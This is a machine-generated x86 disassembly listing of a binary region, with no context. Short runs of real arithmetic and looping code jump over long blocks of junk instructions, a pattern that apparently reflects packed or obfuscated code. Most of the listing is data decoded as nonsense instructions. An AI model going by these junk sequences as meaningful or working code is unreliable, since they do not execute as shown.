  404c11:	mov    ds:0x4a9cbb84,eax
  404c16:	sti    
  404c17:	inc    esi
  404c18:	cmc    
  404c19:	mov    BYTE PTR [edx+0x59af324f],0xeb
  404c20:	sbb    edx,ebp
  404c22:	xchg   esi,eax
  404c23:	(bad)  
  404c24:	cld    
  404c25:	aaa    
  404c26:	xor    edi,DWORD PTR [edx+0x38b71113]
  404c2c:	jge    0x404ca9
  404c2e:	push   0xb83a680d
  404c33:	xchg   DWORD PTR [ecx+ebp*8-0x546e92e7],esi
  404c3a:	enter  0x929,0x5b
  404c3e:	push   eax
  404c3f:	mov    bh,al
  404c41:	push   ss
  404c42:	cmp    DWORD PTR [ecx+0x4b],edx
  404c45:	mov    al,BYTE PTR [ecx+0x4d67b0df]
  404c4b:	add    al,0xec
  404c4d:	xchg   ebx,eax
  404c4e:	imul   esi,DWORD PTR [ecx],0x23
  404c51:	xor    DWORD PTR [ebx],0x55ae2b1a
  404c57:	scas   al,BYTE PTR es:[edi]
  404c58:	ror    DWORD PTR [esi-0x640bb710],1
  404c5e:	fmul   st(5),st
  404c60:	adc    DWORD PTR [ebx],esi
  404c62:	sub    DWORD PTR [ecx+0x2f],ecx
  404c65:	sub    DWORD PTR [edi+0xb1b3be4],edi
  404c6b:	jb     0x404bf6
  404c6d:	push   ebp
  404c6e:	in     al,dx
  404c6f:	mov    edx,DWORD PTR [ebp-0xc]
  404c72:	mov    edi,DWORD PTR [ebp-0x24]
  404c75:	jmp    0x404dda
  404c7a:	or     al,BYTE PTR [ecx-0x1aa2d1be]
  404c80:	push   0xffffffbd
  404c82:	cmp    eax,ecx
  404c84:	dec    esi
  404c85:	shl    DWORD PTR [ebx],0x54
  404c88:	(bad)  
  404c89:	sub    eax,0x7c7c15d6
  404c8e:	xor    al,0x7f
  404c90:	jl     0x404d0e
  404c92:	jb     0x404d02
  404c94:	push   esp
  404c95:	lahf   
  404c96:	and    ebp,eax
  404c98:	jecxz  0x404c59
  404c9a:	sahf   
  404c9b:	inc    ebx
  404c9c:	add    BYTE PTR [edx-0x1feee9ef],bh
  404ca2:	cmp    ch,BYTE PTR [esi+0x5f0142ac]
  404ca8:	adc    ch,BYTE PTR [edx-0x552a2b]
  404cae:	scas   eax,DWORD PTR es:[edi]
  404caf:	pop    esi
  404cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cb1:	fdiv   st(3),st
  404cb3:	ds leave 
  404cb5:	and    esp,edx
  404cb7:	fst    DWORD PTR [edi]
  404cb9:	inc    eax
  404cba:	inc    eax
  404cbb:	shr    DWORD PTR [ebx],1
  404cbd:	mov    ebp,0xd4307ba4
  404cc2:	hlt    
  404cc3:	fisttp QWORD PTR [ebx]
  404cc5:	jno    0x404ca6
  404cc7:	or     dl,BYTE PTR [ecx-0x43]
  404cca:	pop    esi
  404ccb:	mov    ds:0x2a526132,eax
  404cd0:	or     edi,DWORD PTR [ebx+ecx*1+0x12]
  404cd4:	dec    ebp
  404cd5:	lods   al,BYTE PTR ds:[esi]
  404cd6:	mov    dl,0x90
  404cd8:	shl    BYTE PTR [edx+0x4a00b426],0xe8
  404cdf:	inc    esp
  404ce0:	sbb    esi,DWORD PTR [ebx+0x32ff1684]
  404ce6:	inc    eax
  404ce7:	xchg   ecx,eax
  404ce8:	out    0x42,al
  404cea:	cmp    BYTE PTR [edi+0x7587c2d7],dl
  404cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cf1:	dec    ecx
  404cf2:	data16 fidiv WORD PTR [edi+ebp*2-0x7f]
  404cf7:	dec    ebp
  404cf8:	gs xchg ecx,eax
  404cfa:	lock dec ecx
  404cfc:	sbb    BYTE PTR [esi],ah
  404cfe:	test   eax,0xb4e93858
  404d03:	or     eax,0x60a29150
  404d08:	addr16 popf 
  404d0a:	sub    edi,ecx
  404d0c:	add    dl,dl
  404d0e:	clc    
  404d0f:	js     0x404ce8
  404d11:	ret    0xca7a
  404d14:	scas   eax,DWORD PTR es:[edi]
  404d15:	int    0xa4
  404d17:	arpl   WORD PTR [ebx-0x35],dx
  404d1a:	call   0x692343
  404d1f:	xchg   esi,eax
  404d20:	xchg   ebx,eax
  404d21:	add    eax,0x9129b556
  404d26:	fdivr  DWORD PTR [ebx]
  404d28:	fild   WORD PTR [eax+eax*8-0x5c]
  404d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d2d:	and    BYTE PTR [esi-0x2d],ah
  404d30:	and    ch,bl
  404d32:	inc    ecx
  404d33:	xchg   al,ah
  404d35:	xchg   DWORD PTR [ecx+0x16a47f6c],eax
  404d3b:	or     DWORD PTR [edi],0xffffffc2
  404d3e:	pusha  
  404d3f:	cdq    
  404d40:	js     0x404d66
  404d42:	imul   bx,WORD PTR [ebp+eax*4+0x5],0xd1e9
  404d49:	loopne 0x404ce1
  404d4b:	pop    ecx
  404d4c:	les    eax,FWORD PTR [edi]
  404d4e:	sub    DWORD PTR [esi],edi
  404d50:	(bad)  
  404d51:	mov    bh,0x4f
  404d53:	dec    eax
  404d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d55:	cli    
  404d56:	jne    0x404d4d
  404d58:	(bad)  
  404d59:	mov    ebp,0xe6eb0bf3
  404d5e:	push   ebp
  404d5f:	mov    bh,0x37
  404d61:	inc    edi
  404d62:	fild   WORD PTR [ebx]
  404d64:	inc    edx
  404d65:	xor    BYTE PTR [eax],ch
  404d67:	popf   
  404d68:	inc    ebp
  404d69:	out    dx,al
  404d6a:	clc    
  404d6b:	cmp    DWORD PTR [edi],esi
  404d6d:	xor    BYTE PTR [edi],bl
  404d6f:	add    ch,cl
  404d71:	popf   
  404d72:	es inc ebp
  404d74:	fs ss mul eax
  404d78:	adc    eax,0x837d4538
  404d7d:	mov    ch,ch
  404d7f:	call   0x7e1b:0x1a3a64c7
  404d86:	(bad)
  404d89:	mov    esi,0x6ced111f
  404d8e:	push   edx
  404d8f:	xchg   edi,eax
  404d90:	or     BYTE PTR [edx-0x392526ab],cl
  404d96:	jmp    0x404d58
  404d98:	mov    dl,0xbb
  404d9a:	je     0x404dae
  404d9c:	out    dx,al
  404d9d:	mov    ebp,0xf7f99f67
  404da2:	jle    0x404dcd
  404da4:	ds pop eax
  404da6:	add    DWORD PTR [ebx],esp
  404da8:	jo     0x404de3
  404daa:	or     DWORD PTR [ecx-0xc7daa13],esp
  404db0:	jle    0x404e26
  404db2:	mov    ebp,0xd48dec20
  404db7:	mov    dl,0xa0
  404db9:	inc    esi
  404dba:	pop    ss
  404dbb:	popf   
  404dbc:	or     dh,BYTE PTR [eax+0x18]
  404dbf:	jle    0x404d6d
  404dc1:	xor    eax,0x9dd8e578
  404dc6:	pop    edi
  404dc7:	and    al,BYTE PTR [edi]
  404dc9:	inc    BYTE PTR [ecx]
  404dcb:	sbb    BYTE PTR [esi+0x1de6d634],bl
  404dd1:	xchg   BYTE PTR [ebx],al
  404dd3:	cdq    
  404dd4:	test   DWORD PTR [ebp-0x6e],ebx
  404dd7:	mov    esp,0xd033fdb0
  404ddc:	add    edx,ecx
  404dde:	imul   edx,edi
  404de1:	mov    edi,DWORD PTR [ebp-0xc]
  404de4:	xor    edi,eax
  404de6:	sub    edx,edi
  404de8:	mov    edi,DWORD PTR [ebp-0xc]
  404deb:	mov    ebx,DWORD PTR [ebp-0x14]
  404dee:	jmp    0x404f53
  404df3:	push   ebx
  404df4:	pop    ebx
  404df5:	inc    edx
  404df6:	cmp    DWORD PTR [edx-0x67],0x31957d53
  404dfd:	jb     0x404e2d
  404dff:	cs das 
  404e01:	mov    ch,0x60
  404e03:	scas   al,BYTE PTR es:[edi]
  404e04:	adc    al,0x7c
  404e06:	jl     0x404e3c
  404e08:	jg     0x404e86
  404e0a:	jl     0x404dfc
  404e0c:	mov    ebx,0xc01975f0
  404e11:	sti    
  404e12:	pop    ebx
  404e13:	xor    DWORD PTR [esi+0x17fc45c8],ebp
  404e19:	add    ch,BYTE PTR [edi+0x49f72846]
  404e1f:	mov    bl,0x41
  404e21:	test   bl,0x87
  404e24:	sub    esp,esp
  404e26:	mov    ds:0x49802e33,eax
  404e2b:	fidiv  WORD PTR [esi+0x7]
  404e2e:	mov    dh,0xc2
  404e30:	cli    
  404e31:	mov    BYTE PTR [ebx+0x10adc5cc],dh
  404e37:	mov    al,ds:0x88c38aea
  404e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e3d:	div    dh
  404e3f:	and    BYTE PTR [esi+0x43],bh
  404e42:	xor    DWORD PTR [ebx+edi*2],edx
  404e45:	xchg   edi,eax
  404e46:	cld    
  404e47:	dec    ecx
  404e48:	bound  ebx,QWORD PTR [edi]
  404e4a:	pop    ecx
  404e4b:	and    BYTE PTR [edi],ah
  404e4d:	xchg   ebp,eax
  404e4e:	push   ss
  404e4f:	mov    dh,0x1a
  404e51:	test   al,0x31
  404e53:	add    ch,BYTE PTR [edi+0x4e]
  404e56:	cmp    esi,esi
  404e58:	gs cld 
  404e5a:	data16 std 
  404e5c:	fst    QWORD PTR [ecx]
  404e5e:	mov    BYTE PTR [eax-0x119c3d86],0xf6
  404e65:	xchg   ebp,eax
  404e66:	push   ds
  404e67:	call   0x30c561b4
  404e6c:	cwde   
  404e6d:	cmp    BYTE PTR [edi-0x38bc1aa1],bh
  404e73:	pop    ds
  404e74:	jbe    0x404e16
  404e76:	inc    eax
  404e77:	inc    bh
  404e79:	add    BYTE PTR [esi],ch
  404e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e7c:	mov    ds:0xd424ce93,eax
  404e81:	aaa    
  404e82:	sbb    al,0xf
  404e84:	push   ebp
  404e85:	cdq    
  404e86:	jmp    DWORD PTR [ecx+0xe]
  404e89:	ds sti 
  404e8b:	mov    esp,0xca325b40
  404e90:	inc    ebx
  404e91:	out    0xe5,al
  404e93:	clc    
  404e94:	cmp    BYTE PTR [esp+ecx*8+0x51],dl
  404e98:	inc    ebp
  404e99:	jecxz  0x404ee7
  404e9b:	shl    DWORD PTR [eax-0x6c],1
  404e9e:	jne    0x404ec6
  404ea0:	test   DWORD PTR [ebp-0x659ef63e],esp
  404ea6:	aaa    
  404ea7:	ja     0x404e65
  404ea9:	jo     0x404ee8
  404eab:	repz test dl,bl
  404eae:	xor    ebp,ebx
  404eb0:	xchg   ebx,eax
  404eb1:	imul   esp,edi,0x74
  404eb4:	push   ds
  404eb5:	and    ah,BYTE PTR [esi]
  404eb7:	daa    
  404eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eb9:	enter  0xf18f,0xa0
  404ebd:	imul   ebx,DWORD PTR [ebp+0x74],0x9c6a28d
  404ec4:	cmp    BYTE PTR [esi],0xe5
  404ec7:	aas    
  404ec8:	or     BYTE PTR [ebx-0x22],dl
  404ecb:	mov    dh,0x34
  404ecd:	dec    BYTE PTR [ecx-0x31]
  404ed0:	ror    dh,0x33
  404ed3:	inc    edx
  404ed4:	cmp    al,0x2f
  404ed6:	jecxz  0x404f4b
  404ed8:	pop    es
  404ed9:	push   ds
  404eda:	out    dx,al
  404edb:	jecxz  0x404ef6
  404edd:	jge    0x404f55
  404edf:	mov    BYTE PTR ds:[edi+0x64],dh
  404ee3:	mov    BYTE PTR [edx+edi*1-0x158f3780],bh
  404eea:	outs   dx,DWORD PTR ds:[esi]
  404eeb:	sbb    esp,DWORD PTR [edx+0x55fb511e]
  404ef1:	adc    BYTE PTR [esi-0x61ccc19d],dl
  404ef7:	sub    bl,bh
  404ef9:	inc    edx
  404efa:	pusha  
  404efb:	js     0x404ec0
  404efd:	pop    esi
  404efe:	xchg   esi,eax
  404eff:	test   DWORD PTR ds:0x706041e0,ebp
  404f05:	add    cl,BYTE PTR [ebx]
  404f07:	sub    bl,BYTE PTR [ebx+ebx*8-0x41]
  404f0b:	mov    ebp,0x469fa952
  404f10:	xor    edi,0x40
  404f13:	push   ebx
  404f14:	sbb    eax,0x96935b23
  404f19:	and    al,0x9
  404f1b:	jo     0x404eae
  404f1d:	out    0x52,eax
  404f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f20:	psrlq  mm7,QWORD PTR [edi+0x15]
  404f24:	daa    
  404f25:	mov    esp,0x3180339c
  404f2a:	mov    BYTE PTR [ecx+0x3b],ah
  404f2d:	out    dx,al
  404f2e:	in     eax,dx
  404f2f:	les    esi,FWORD PTR [ebp-0x77]
  404f32:	test   DWORD PTR [edi+0x1],0x3b023669
  404f39:	pop    ecx
  404f3a:	mul    DWORD PTR [edi+0x79577408]
  404f40:	jns    0x404ed1
  404f42:	mov    cl,0xb5
  404f44:	sub    BYTE PTR [edi-0x3b],bh
  404f47:	test   ebp,0xf2c99d5
  404f4d:	push   cs
  404f4e:	adc    DWORD PTR [ebx+0x3323139a],0xfffffff8
  404f55:	add    edi,ecx
  404f57:	imul   edi,ebx
  404f5a:	mov    ebx,DWORD PTR [ebp-0x18]
  404f5d:	xor    ebx,eax
  404f5f:	sub    edx,ecx
  404f61:	lea    edi,[edi+ebx*1+0x32729e]
  404f68:	cmp    edi,edx
  404f6a:	jbe    0x4047d5
  404f70:	mov    edx,DWORD PTR [ebp-0xc]
  404f73:	mov    edi,DWORD PTR [ebp-0x24]
  404f76:	xor    edx,eax
  404f78:	add    edx,ecx
  404f7a:	imul   edx,edi
  404f7d:	mov    edi,DWORD PTR [ebp-0x18]
  404f80:	xor    edi,eax
  404f82:	add    edx,edi
  404f84:	mov    edi,DWORD PTR [ebp-0x8]
  404f87:	lea    edx,[edx+edi*1+0x32729e]
  404f8e:	mov    DWORD PTR [ebp-0x8],edx
  404f91:	jmp    0x4050f6
  404f96:	jecxz  0x404f49
  404f98:	out    0xe3,eax
  404f9a:	jge    0x405019
  404f9c:	sti    
  404f9d:	mov    cl,0x66
  404f9f:	pop    edx
  404fa0:	cmp    BYTE PTR ds:0x78bf3ea4,cl
  404fa6:	popw   ss
  404fa8:	jl     0x405026
  404faa:	xor    al,0x7f
  404fac:	jl     0x40502a
  404fae:	lods   eax,DWORD PTR ds:[esi]
  404faf:	or     al,0x50
  404fb1:	sti    
  404fb2:	and    eax,0x996e26d1
  404fb7:	adc    eax,0x6c522afe
  404fbc:	xlat   BYTE PTR ds:[ebx]
  404fbd:	push   edx
  404fbe:	adc    eax,DWORD PTR [esi]
  404fc0:	aam    0x6a
  404fc2:	sbb    al,0xd2
  404fc4:	(bad)  [edx]
  404fc6:	cmp    ecx,ecx
  404fc8:	pop    edx
  404fc9:	repnz inc ecx
  404fcb:	pop    esp
  404fcc:	sub    eax,0xfe494d12
  404fd1:	sub    al,0x8e
  404fd3:	icebp  
  404fd4:	clc    
  404fd5:	cmp    al,0x8c
  404fd7:	jnp    0x40503d
  404fd9:	enter  0x250d,0xfc
  404fdd:	jns    0x405055
  404fdf:	cmp    ecx,DWORD PTR [ecx+edi*8+0x0]
  404fe3:	dec    edi
  404fe4:	mov    esi,0x3191e8f3
  404fea:	mov    edx,0x96920567
  404fef:	test   eax,0x229a84c7
  404ff4:	jmp    0x13d6e1a7
  404ff9:	fistp  DWORD PTR [ecx+0x3490de6e]
  404fff:	inc    ebp
  405000:	in     eax,0x6c
  405002:	div    BYTE PTR [esi]
  405004:	push   esp
  405005:	pop    ds
  405006:	mov    ds:0xfb9f24b6,eax
  40500b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40500c:	fs pop es
  40500e:	pop    ebx
  40500f:	adc    eax,0xd48d0194
  405014:	mov    bh,0x41
  405016:	in     al,0x1
  405018:	adc    BYTE PTR [edi-0x527ae7dc],dh
  40501e:	les    esp,FWORD PTR [edx]
  405020:	mov    edx,0x44581d64
  405025:	mov    BYTE PTR [eax+0x7c],ch
  405028:	xchg   ebx,eax
  405029:	imul   ebp,eax,0x56
  40502c:	fs ret 
  40502e:	add    DWORD PTR [edx],esi
  405030:	xchg   ebx,eax
  405031:	sbb    BYTE PTR [esi],dh
  405033:	pop    ebp
  405034:	pop    eax
  405035:	jb     0x40507d
  405037:	sbb    esi,DWORD PTR [edi+0x40]
  40503a:	mov    ebx,esi
  40503c:	cmp    eax,0x9faa2f7e
  405041:	les    ecx,FWORD PTR [esp+esi*2-0x68a9595c]
  405048:	or     al,0xd5
  40504a:	lods   eax,DWORD PTR ds:[esi]
  40504b:	xchg   eax,ebx
  40504d:	pop    esp
  40504e:	mov    esp,0xe5b1b2ad
  405053:	aaa    
  405054:	aad    0xb2
  405056:	(bad)  
  405057:	in     al,0xff
  405059:	addr16 in eax,dx
  40505b:	scas   al,BYTE PTR es:[edi]
  40505c:	inc    ebx
  40505d:	pop    ds
  40505e:	inc    ecx
  40505f:	jl     0x4050a5
  405061:	in     al,0x84
  405063:	das    
  405064:	xlat   BYTE PTR ds:[ebx]
  405065:	jl     0x40501e
  405067:	jmp    0x40504b
  405069:	ret    
  40506a:	fild   QWORD PTR [esi-0x7f]
  40506d:	clc    
  40506e:	sub    cl,BYTE PTR [edi-0x159b350]
  405074:	jle    0x4050df
  405076:	xchg   BYTE PTR [ebp+edx*1-0x30],bh
  40507a:	icebp  
  40507b:	outs   dx,BYTE PTR ds:[esi]
  40507c:	inc    ebp
  40507d:	add    DWORD PTR [ebx],0x77
  405080:	repnz adc BYTE PTR [ecx+0x36bc9603],0x86
  405088:	xor    ecx,DWORD PTR [ebx+0x132b402e]
  40508e:	mov    al,ds:0xebcef802
  405093:	in     eax,0x4a
  405095:	bound  ebp,QWORD PTR [edx]
  405097:	dec    ebp
  405098:	in     eax,dx
  405099:	inc    esi
  40509a:	es pop ecx
  40509c:	adc    edx,0x420af5cc
  4050a2:	ss jecxz 0x4050e1
  4050a5:	lahf   
  4050a6:	mov    edx,0x3f7dcb56
  4050ab:	and    BYTE PTR [ecx*4+0xc884773],cl
  4050b2:	mov    ecx,DWORD PTR [eax-0x6b488dbf]
  4050b8:	xor    eax,0x690f3042
  4050bd:	cld    
  4050be:	sbb    eax,0xf476e8b1
  4050c3:	rcr    DWORD PTR [ebp-0x25ffcfd6],cl
  4050c9:	mov    dh,0x30
  4050cb:	mov    ecx,0x5eedf6fb
  4050d0:	pushf  
  4050d1:	push   cs
  4050d2:	push   0x2fd0c86e
  4050d7:	adc    edx,0xffffffe4
  4050da:	mov    al,0xf1
  4050dc:	mov    eax,esp
  4050de:	dec    edx
  4050df:	cmp    dl,dl
  4050e1:	mov    edi,0xe8a09d4
  4050e6:	jmp    0x10ec19f3
  4050eb:	ja     0x405106
  4050ed:	mov    ecx,0xb5540ec8
  4050f2:	ret    0xa471
  4050f5:	push   esp
  4050f6:	mov    edx,DWORD PTR [ebp-0x20]
  4050f9:	xor    edx,eax
  4050fb:	mov    edi,0xffcd8d62
  405100:	sub    edi,edx
  405102:	add    edi,DWORD PTR [ebp-0x10]
  405105:	mov    edx,DWORD PTR [ebp-0x20]
  405108:	mov    ebx,DWORD PTR [ebp-0x8]
  40510b:	xor    edx,eax
  40510d:	add    edx,ecx
  40510f:	imul   edx,ebx
  405112:	cmp    edx,edi
  405114:	jbe    0x4038c9
  40511a:	pop    ebx
  40511b:	pop    edi
  40511c:	leave  
  40511d:	ret    0x8
  405120:	push   ebp
  405121:	mov    ebp,esp
  405123:	push   ecx
  405124:	adc    DWORD PTR ds:0x41074f,ebx
  40512a:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  405131:	and    DWORD PTR ds:0x4479a0,0x0
  40513b:	jmp    0x40514d
  405140:	mov    edx,DWORD PTR ds:0x4479a0
  405146:	inc    edx
  405147:	mov    DWORD PTR ds:0x4479a0,edx
  40514d:	cmp    DWORD PTR ds:0x4479a0,0x10
  405154:	jae    0x40518d
  40515a:	cmp    DWORD PTR ds:0x4479a0,0x18
  405161:	jne    0x40517b
  405167:	push   DWORD PTR [ebp-0x10]
  40516a:	push   DWORD PTR [ebp-0x14]
  40516d:	push   0x410939
  405172:	push   DWORD PTR [ebp-0x10]
  405175:	call   DWORD PTR ds:0x442010
  40517b:	jmp    0x405140
  405180:	movzx  edx,BYTE PTR ds:0x44a6e4
  405187:	adc    DWORD PTR ds:0x424726,edx
  40518d:	mov    eax,DWORD PTR [ebp-0x4]
  405190:	adc    edx,ecx
  405192:	jmp    0x4052a5
  405197:	shr    DWORD PTR [ebp+0x4e7dfe7d],cl
  40519d:	sti    
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	fs jne 0x40519a
  4051a2:	push   edi
  4051a3:	repz test al,0xb5
  4051a6:	sub    DWORD PTR [esi],edi
  4051a8:	sub    DWORD PTR [esp+edi*2+0x62],edi
  4051ac:	jl     0x40522a
  4051ae:	jl     0x405181
  4051b0:	stos   BYTE PTR es:[edi],al
  4051b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051b2:	outs   dx,DWORD PTR ds:[esi]
  4051b3:	fxch   st(6)
  4051b5:	jecxz  0x405226
  4051b7:	jmp    0x4051b1
  4051b9:	outs   dx,BYTE PTR ds:[esi]
  4051ba:	sub    DWORD PTR [edx],edi
  4051bc:	popa   
  4051bd:	sbb    edi,ecx
  4051bf:	xlat   BYTE PTR ds:[ebx]
  4051c0:	cmc    
  4051c1:	rcr    DWORD PTR [edx+0x37fcf9ae],cl
  4051c7:	and    dl,BYTE PTR [esi+edi*4+0x21cd763d]
  4051ce:	inc    esp
  4051cf:	es mov al,0x71
  4051d2:	mov    fs,WORD PTR [ebp-0x53]
  4051d5:	jmp    0xc0fce98d
  4051da:	hlt    
  4051db:	sub    DWORD PTR [ebx],ebp
  4051dd:	add    dl,BYTE PTR [ebp-0x3421d482]
  4051e3:	add    ebx,edx
  4051e5:	and    bl,cl
  4051e7:	lahf   
  4051e8:	in     al,0xf1
  4051ea:	xchg   BYTE PTR [ecx+eiz*4+0x18719cd3],cl
  4051f1:	call   0xd9e70a4f
  4051f6:	sete   BYTE PTR ds:0xeabf8ec6
  4051fd:	cld    
  4051fe:	xchg   BYTE PTR [esi-0x35aac60c],dh
  405204:	sub    al,0x70
  405206:	cwde   
  405207:	mov    al,0x86
  405209:	push   ss
  40520a:	(bad)  
  40520b:	cli    
  40520c:	push   ss
  40520d:	dec    eax
  40520e:	pop    edx
  40520f:	jp     0x4051af
  405211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405212:	into   
  405213:	sub    BYTE PTR [ebx+esi*8-0x2d1513e],ah
  40521a:	mov    cl,BYTE PTR [eax+0x21]
  40521d:	pop    eax
  40521e:	shl    DWORD PTR [ecx],0x23
  405221:	rol    DWORD PTR [edi-0x452f831d],0x30
  405228:	mov    dh,0x50
  40522a:	pop    ebx
  40522b:	inc    esi
  40522c:	pop    ebp
  40522d:	repz fsubr st,st(3)
  405230:	test   BYTE PTR [ebx+eiz*2],cl
  405233:	mov    edi,0xaf6a11f5
  405238:	mov    esp,?
  40523a:	jecxz  0x4051d5
  40523c:	inc    ecx
  40523d:	icebp  
  40523e:	scas   eax,DWORD PTR es:[edi]
  40523f:	sub    esi,ebp
  405241:	sahf   
  405242:	inc    eax
  405243:	inc    edx
  405244:	into   
  405245:	scas   eax,DWORD PTR es:[edi]
  405246:	stos   DWORD PTR es:[edi],eax
  405247:	inc    ecx
  405248:	mov    dh,0x3
  40524a:	add    ebx,0x47
  40524d:	sbb    al,0x26
  40524f:	push   cs
  405250:	and    al,0x85
  405252:	inc    ebp
  405253:	mov    edx,0xbabcc57
  405258:	and    BYTE PTR [ecx+0x2c81ce8a],cl
  40525e:	and    ebp,esi
  405260:	add    DWORD PTR [ecx-0x21],edx
  405263:	jns    0x405216
  405265:	mov    ds:0x2e07b0cf,eax
  40526a:	stos   DWORD PTR es:[edi],eax
  40526b:	ds ins BYTE PTR es:[edi],dx
  40526d:	pop    esp
  40526e:	sub    dh,BYTE PTR [ebp-0x7b2f04a8]
  405274:	das    
  405275:	mov    eax,ds:0x91a44433
  40527a:	or     al,0x56
  40527c:	xchg   DWORD PTR [ecx+0x2741e179],esi
  405282:	das    
  405283:	mov    bh,0xad
  405285:	and    ecx,ebp
  405287:	inc    esp
  405288:	push   edx
  405289:	mov    ebx,0x63ab643
  40528e:	mov    ?,edx
  405290:	push   esp
  405291:	jb     0x405226
  405293:	xchg   ebp,eax
  405294:	xor    bl,bh
  405296:	aad    0x9b
  405298:	clc    
  405299:	or     dh,BYTE PTR [edx+eiz*2]
  40529c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40529d:	std    
  40529e:	add    BYTE PTR [ebx],bl
  4052a0:	jae    0x4052e9
  4052a2:	push   eax
  4052a3:	mov    cl,0x65
  4052a5:	mov    edx,DWORD PTR [ebp+0x10]
  4052a8:	jmp    0x4053bb
  4052ad:	shl    ecx,0xe4
  4052b0:	xchg   edi,eax
  4052b1:	fs jns 0x4052f5
  4052b4:	jns    0x4052eb
  4052b6:	adc    al,0x56
  4052b8:	jne    0x4052c2
  4052ba:	das    
  4052bb:	ret    
  4052bc:	push   ds
  4052bd:	and    al,0x28
  4052bf:	jl     0x40533d
  4052c1:	bound  edi,QWORD PTR [esp+edi*2+0x7c]
  4052c5:	imul   ebp,ebp,0xfffffffa
  4052c8:	xchg   ebx,eax
  4052c9:	xor    eax,0x1a9682ed
  4052ce:	enter  0x94c1,0xb8
  4052d2:	pop    ecx
  4052d3:	adc    eax,DWORD PTR [edi-0x3]
  4052d6:	inc    ebx
  4052d7:	and    eax,0x74462c3
  4052dc:	ret    
  4052dd:	lea    esi,[ebx]
  4052df:	imul   BYTE PTR [edi*8+0x5c57e3a9]
  4052e6:	lahf   
  4052e7:	out    0x59,eax
  4052e9:	jnp    0x405274
  4052eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ec:	stos   DWORD PTR es:[edi],eax
  4052ed:	jbe    0x405295
  4052ef:	into   
  4052f0:	xchg   edi,eax
  4052f1:	add    edx,ebp
  4052f3:	scas   eax,DWORD PTR es:[edi]
  4052f4:	adc    eax,0x32551ec3
  4052f9:	rcl    BYTE PTR [ecx+0x1ed37888],0xd5
  405300:	call   0x709c:0xa94f39f3
  405307:	jge    0x405300
  405309:	inc    edx
  40530a:	xor    DWORD PTR [edx-0x697c8f3c],eax
  405310:	fcmovnb st,st(4)
  405312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405313:	inc    ebp
  405314:	clc    
  405315:	fcomp  QWORD PTR [edx-0x3eb727]
  40531b:	push   edi
  40531c:	mov    eax,0xc4a805c8
  405321:	retf   0x4c8e
  405324:	aaa    
  405325:	xlat   BYTE PTR ds:[ebx]
  405326:	aaa    
  405327:	call   0x23bd2472
  40532c:	rcr    DWORD PTR [ecx+0x5a],0xd6
  405330:	push   esi
  405331:	jne    0x40537f
  405333:	ficomp DWORD PTR [ebp+0x32c6e4f6]
  405339:	retf   0x2ec2
  40533c:	inc    ebp
  40533d:	pop    ds
  40533e:	in     al,0xc8
  405340:	jg     0x4052dd
  405342:	popf   
  405343:	xor    al,0xb3
  405345:	xchg   ebp,eax
  405346:	fprem1 
  405348:	jbe    0x405367
  40534a:	add    edi,ebx
  40534c:	mov    bh,0xff
  40534e:	xor    ecx,ebp
  405350:	fsqrt  
  405352:	rcr    BYTE PTR [ebp-0x2],cl
  405355:	jbe    0x405344
  405357:	xor    al,0x81
  405359:	div    ecx
  40535b:	mov    al,ds:0x8ee259ef
  405360:	and    al,0x4a
  405362:	push   esp
  405363:	cmp    BYTE PTR [edi],cl
  405365:	int3   
  405366:	push   ss
  405367:	xor    DWORD PTR [esi+0x31],edx
  40536a:	xchg   esp,eax
  40536b:	push   esi
  40536c:	pop    eax
  40536d:	ja     0x405389
  40536f:	pop    ds
  405370:	ins    DWORD PTR es:[edi],dx
  405371:	jae    0x405367
  405373:	cmp    DWORD PTR [ecx-0x6a],edi
  405376:	push   ecx
  405377:	ror    DWORD PTR [esp+eax*4-0x31],cl
  40537b:	jp     0x4053c8
  40537d:	(bad)  
  40537f:	cld    
  405380:	pop    ecx
  405381:	adc    al,0x7c
  405383:	xchg   ah,ch
  405385:	call   DWORD PTR [eax+edx*2]
  405388:	jmp    0x40530b
  40538a:	sbb    dh,BYTE PTR [edx+0x876acfb]
  405390:	add    al,0x5
  405392:	std    
  405393:	call   0x56c1:0xfed8009a
  40539a:	adc    BYTE PTR [esi*2-0x1d7bf374],dh
  4053a1:	stc    
  4053a2:	ins    DWORD PTR es:[edi],dx
  4053a3:	jmp    0x40536b
  4053a5:	aad    0x5e
  4053a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053a8:	cli    
  4053a9:	lods   eax,DWORD PTR ds:[esi]
  4053aa:	dec    ecx
  4053ab:	paddusw mm1,QWORD PTR ds:0x9caa68e
  4053b2:	inc    ecx
  4053b3:	fst    st(1)
  4053b5:	mov    dh,0xde
  4053b7:	pop    edx
  4053b8:	rol    BYTE PTR [eax-0x21],0xb9
  4053bc:	push   edi
  4053bd:	or     BYTE PTR [ecx+0x7],dl
  4053c0:	xor    DWORD PTR ds:0x42472e,0x5c99
  4053ca:	xor    eax,ecx
  4053cc:	add    eax,0x32729e
  4053d1:	sub    DWORD PTR ds:0x42473a,0x41074b
  4053db:	mov    DWORD PTR [edx],eax
  4053dd:	mov    eax,DWORD PTR [ebp+0xc]
  4053e0:	xor    eax,ecx
  4053e2:	push   esi
  4053e3:	add    DWORD PTR ds:0x44a6e4,0x2efc
  4053ed:	mov    esi,DWORD PTR [ebp+0x10]
  4053f0:	mov    edx,0x32729e
  4053f5:	sub    DWORD PTR ds:0x44d428,0x7c97
  4053ff:	add    eax,edx
  405401:	xor    DWORD PTR ds:0x44d428,0x44a6dc
  40540b:	mov    DWORD PTR [esi+0x4],eax
  40540e:	mov    DWORD PTR ds:0x44d424,0x1d
